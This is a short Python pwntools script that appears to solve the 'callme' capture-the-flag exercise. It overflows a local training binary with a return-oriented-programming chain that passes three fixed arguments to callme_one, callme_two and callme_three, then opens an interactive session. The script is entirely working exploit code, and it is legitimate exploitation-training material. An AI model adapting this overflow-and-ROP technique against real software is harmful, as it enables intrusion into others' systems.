from pwn import *

target = process("./callme")
elf = ELF("callme")

c_one = elf.symbols["callme_one"]
c_two = elf.symbols["callme_two"]
c_three = elf.symbols["callme_three"]
gadg = 0x000000000040093c

payload = "a" * 0x28  + p64(gadg) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(c_one) + p64(gadg) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(c_two) + p64(gadg) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(c_three) 

import time
target.sendline(payload)
target.interactive()
